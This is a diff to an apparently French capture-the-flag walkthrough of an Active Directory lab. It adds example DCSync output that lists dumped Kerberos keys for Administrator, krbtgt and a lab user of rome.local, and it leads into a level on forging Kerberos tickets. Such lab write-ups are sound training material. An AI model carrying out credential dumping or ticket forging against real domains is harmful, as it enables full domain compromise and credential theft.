@@ -403,6 +403,22 @@ Dans certains environnements CTF, on vous demandera explicitement :
 
 Flag à soumettre : be0c07d7a82f4e1a9b7c3a5a6f7b8c9d
 
+
+Exemple de resultat du DSYNC 
+
+``` shell
+    [*] Kerberos keys grabbed
+    Administrator:aes256-cts-hmac-sha1-96:633c7562bd5ba07fe8c4c1377e425b7f2321b888d1062a3eea6faa56c699bdb8
+    Administrator:aes128-cts-hmac-sha1-96:43698b1518eb55fcd7589b8f81e7f4f1
+    Administrator:des-cbc-md5:e9d057b3514a45cd
+    krbtgt:aes256-cts-hmac-sha1-96:0c953f3998ed392024b3e65d24b3d4aeb590689237a2749f4dd7c4b517d05925
+    krbtgt:aes128-cts-hmac-sha1-96:f78229642decf24f04e4187946409a20
+    krbtgt:des-cbc-md5:2c944c7a23e319b6
+    rome.local\lala:aes256-cts-hmac-sha1-96:e3c4636f8804812a284a56e77008a3997e889af2feb04f7c74cd2ad73d73ed34
+    rome.local\lala:aes128-cts-hmac-sha1-96:cc9e681caf16aa6088b9628ab4a558e5
+    rome.local\lala:des-cbc-md5:737552a76ecd5131
+
+```
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 8: Fabrication ticket Kerberos 
